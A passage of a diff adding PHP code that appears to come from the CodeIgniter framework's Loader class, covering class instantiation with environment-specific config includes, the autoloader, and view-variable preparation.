+include($path.'config/'.ENVIRONMENT.'/'.strtolower($class).'.php');
+$found = TRUE;
+}
+elseif (file_exists($path.'config/'.ENVIRONMENT.'/'.ucfirst(strtolower($class)).'.php'))
+{
+include($path.'config/'.ENVIRONMENT.'/'.ucfirst(strtolower($class)).'.php');
+$found = TRUE;
+}
+
+
+if ($found === TRUE)
+{
+break;
+}
+}
+}
+}
+$class_name = $prefix.$class;
+
+if ( ! class_exists($class_name, FALSE))
+{
+log_message('error', 'Non-existent class: '.$class_name);
+show_error('Non-existent class: '.$class_name);
+}
+
+
+if (empty($object_name))
+{
+$object_name = strtolower($class);
+if (isset($this->_ci_varmap[$object_name]))
+{
+$object_name = $this->_ci_varmap[$object_name];
+}
+}
+
+$CI =& get_instance();
+if (isset($CI->$object_name))
+{
+if ($CI->$object_name instanceof $class_name)
+{
+log_message('debug', $class_name." has already been instantiated as '".$object_name."'. Second attempt aborted.");
+return;
+}
+show_error("Resource '".$object_name."' already exists and is not a ".$class_name." instance.");
+}
+
+$this->_ci_classes[$object_name] = $class;
+
+$CI->$object_name = isset($config)
+? new $class_name($config)
+: new $class_name();
+}
+
+
+
+
+
+
+
+
+
+protected function _ci_autoloader()
+{
+if (file_exists(APPPATH.'config/autoload.php'))
+{
+include(APPPATH.'config/autoload.php');
+}
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/autoload.php'))
+{
+include(APPPATH.'config/'.ENVIRONMENT.'/autoload.php');
+}
+if ( ! isset($autoload))
+{
+return;
+}
+
+if (isset($autoload['packages']))
+{
+foreach ($autoload['packages'] as $package_path)
+{
+$this->add_package_path($package_path);
+}
+}
+
+if (count($autoload['config']) > 0)
+{
+foreach ($autoload['config'] as $val)
+{
+$this->config($val);
+}
+}
+
+foreach (array('helper', 'language') as $type)
+{
+if (isset($autoload[$type]) && count($autoload[$type]) > 0)
+{
+$this->$type($autoload[$type]);
+}
+}
+
+if (isset($autoload['drivers']))
+{
+$this->driver($autoload['drivers']);
+}
+
+if (isset($autoload['libraries']) && count($autoload['libraries']) > 0)
+{
+
+if (in_array('database', $autoload['libraries']))
+{
+$this->database();
+$autoload['libraries'] = array_diff($autoload['libraries'], array('database'));
+}
+
+$this->library($autoload['libraries']);
+}
+
+if (isset($autoload['model']))
+{
+$this->model($autoload['model']);
+}
+}
+
+
+
+
+
+
+
+
+
+
+protected function _ci_prepare_view_vars($vars)
+{
+if ( ! is_array($vars))
+{
+$vars = is_object($vars)
+? get_object_vars($vars)
+: array();
+}
+foreach (array_keys($vars) as $key)
+{
+if (strncmp($key, '_ci_', 4) === 0)
+{
+unset($vars[$key]);
+}
+}
+return $vars;
+}
+
+
+
+
+
+
+
+
+
+protected function &_ci_get_component($component)
+{
+$CI =& get_instance();
+return $CI->$component;
+}
+}
